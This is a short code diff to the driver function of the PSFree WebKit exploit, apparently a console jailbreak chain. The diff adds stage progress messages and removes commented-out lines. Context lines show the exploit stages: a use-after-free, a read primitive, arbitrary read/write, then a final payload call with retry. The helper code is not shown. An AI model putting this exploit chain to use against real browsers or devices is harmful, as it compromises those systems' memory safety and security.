@@ -465,10 +465,11 @@ async function make_arw(reader, view2, pop) {
 async function run() {
     try{
     StartTimer();
-    showMessage("Webkit exploit (PSFree) (Step 0 - Readying)"),
+    showMessage("Webkit exploit (PSFree15b) (Step 0 - UaF SSV)"),
     debug_log('STAGE: UaF SSV');
     const [fsets, indices] = prepare_uaf();
     const view = await uaf_ssv(fsets, indices[1]);
+    showMessage("Webkit exploit (PSFree15b) (Step 1 - Read primitive)"),
     debug_log('STAGE: get string relative read primitive');
     const rdr = await make_rdr(view);
     const [view2, pop] = await uaf_ssv(fsets, indices[0], true);   
@@ -476,6 +477,7 @@ async function run() {
         fset.rows = '';
         fset.cols = '';
     }
+    showMessage("Webkit exploit (PSFree15b) (Step 2 - Read/Write primitive)"),
     debug_log('STAGE: achieve arbitrary read/write primitive');
     await make_arw(rdr, view2, pop);
     window.p = {
@@ -527,8 +529,6 @@ async function run() {
         }
     };       
     run_hax();
-    //await new Promise((resolve) => setTimeout(resolve, 30000));
-    //Donetext();
     } catch (error) {
         debug_log("[!] Webkit exploit failed: " + error);
         debug_log("[+] Retrying in 2 seconds...");
